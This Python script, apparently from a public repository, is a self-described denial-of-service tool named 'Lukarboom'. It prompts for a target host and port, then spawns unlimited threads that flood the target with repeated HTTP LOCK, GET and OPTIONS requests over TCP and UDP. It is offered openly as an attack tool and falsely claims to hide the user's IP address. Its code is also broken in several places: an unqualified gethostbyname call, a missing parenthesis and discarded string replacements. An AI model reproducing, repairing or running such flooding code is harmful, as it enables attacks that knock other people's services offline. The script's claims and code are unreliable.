#!/bin/python3
# ( Ddos Tool: Lukarboom)
# By hackforlukas
# MIT License
import threading as par
import os
import socket 
import sys
def send(host, port):
	try:
		ip = gethostbyname(host)
		req1 = f"LOCK / HTTP/1.1\r\nHost: {host}\r\nUser Agent: {host.upper()}/1.0\r\nX-Forwarded-For: {ip}\r\nX-Real-IP: {ip}\r\nDNT: 1\r\nCache-Control: no-cache, no-store, must-revalidate\r\nPragma: no-cache\r\nConnection: keep-alive\r\n\r\n".encode()
		req2 = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser Agent: {host.upper}/1.0\r\nX-Forwarded-For: {ip}\r\nX-Real-IP: {ip}\r\nDNT: 1\r\nCache-Control: no-cache, no-store, must-revalidate\r\nPragma: no-cache\r\nConnection: keep-alive\r\n\r\n".encode()
		req3 = f"OPTIONS / HTTP/1.1\r\nHost: {host}\r\nUser Agent: {host.upper}/1.0\r\nX-Forwarded-For: {ip}\r\nX-Real-IP: {ip}\r\nDNT: 1\r\nCache-Control: no-cache, no-store, must-revalidate\r\nPragma: no-cache\r\nConnection: keep-alive\r\n\r\n".encode()
		s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s1.settimeout(3)
		s2.settimeout(3)
		s1.connect((host, port))
		for _ in range(4):
			s1.sendall(req1)
			s1.sendall(req2)
			s1.sendall(req3)
		for _ in range(4):
			s2.sendto(req1, (host, port))
			s2.sendto(req2, (host, port))
			s2.sendto(req3, (host, port))
		s1.close()
		s2.close()
	except:
		pass
def size(host):
	try:
		ip = socket.gethostbyname(host)
		return len(f"LOCK / HTTP/1.1\r\nHost: {host}\r\nUser Agent: {host.upper()}/1.0\r\nX-Forwarded-For: {ip}\r\nX-Real-IP: {ip}\r\nDNT: 1\r\nCache-Control: no-cache, no-store, must-revalidate\r\nPragma: no-cache\r\nConnection: keep-alive\r\n\r\n".encode())+len(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser Agent: {host.upper}/1.0\r\nX-Forwarded-For: {ip}\r\nX-Real-IP: {ip}\r\nDNT: 1\r\nCache-Control: no-cache, no-store, must-revalidate\r\nPragma: no-cache\r\nConnection: keep-alive\r\n\r\n".encode())+len(f"OPTIONS / HTTP/1.1\r\nHost: {host}\r\nUser Agent: {host.upper}/1.0\r\nX-Forwarded-For: {ip}\r\nX-Real-IP: {ip}\r\nDNT: 1\r\nCache-Control: no-cache, no-store, must-revalidate\r\nPragma: no-cache\r\nConnection: keep-alive\r\n\r\n".encode())*8
	except:
		pass
def start(host, port):
	byte = 0
	pack = size(host)
	num = 0
	ip = socket.gethostbyname(host)
	os.system("clear")
	while True:
		t = par.Thread(target=send, args=(host, port))
		t.start()
		byte += pack
		num += 24
		print(f"\033[31m\n< \033[32mTARGET: {host} HOST: {ip} PORT: {port} \033[31m>\n\n<\033[32m PACK NUM: {num} ALL SİZE: {byte/1024/1024} MB \033[31m>\n\n< \033[32mBy HackerLukas \033[31m>\033[0m")
def menu():
	os.system("clear")
	print("""\033[32m _             _                 _                       
(_)           | |               | |                      
 _       _   _| |  _ _____  ____| |__   ___   ___  ____  
| |     | | | | |_/ |____ |/ ___)  _ \ / _ \ / _ \|    \ 
| |_____| |_| |  _ (/ ___ | |   | |_) ) |_| | |_| | | | |
|_______)____/|_| \_)_____|_|   |____/ \___/ \___/|_|_|_|
           v1.0 by hackforlukas (github)\033[0m""")
	print("\033[31mLukarboom \033[32m~ DdoS-DoS Attack (This Code Hide Your UserAgent and IP Address\n")
	print("\033[31m[01] \033[32mStart Attack\n\033[31m[99] \033[32mExit\n")
	choice = input("\033[31mChoice: \033[32m")
	if choice == "01":
		host = input("\n\033[31mHost or Website: \033[32m")
		port = int(input("\033[31mPort (Standart: 80): \033[32m"))
		host.replace("https://", "")
		host.replace("http://", "")
		start(host, port)
	elif choice == "1":
		host = input("\n\033[31mHost or Website: \033[32m")
		port = int(input("\033[31mPort (Standart: 80): \033[32m"))
		host.replace("https://", "")
		host.replace("http://", ""
		start(host, port)
	elif choice == "99":
		sys.exit()
	else:
		menu()

menu()
